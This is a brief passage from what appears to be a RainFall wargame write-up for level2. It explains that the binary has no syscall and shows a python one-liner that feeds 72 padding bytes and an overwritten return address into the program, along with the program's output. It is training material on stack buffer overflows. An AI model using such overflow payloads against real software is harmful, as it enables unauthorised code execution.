### Exploit

Unlike the previous two levels, there's no syscall in this executable. We therefore need to find a way to call and execute a shell. 


```
    level2@RainFall:~$ python -c 'print "a"*72 + "\xd4\x84\x04\x08"' | ./level2
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaJaaaaԄ
    (0xbffff700)
```
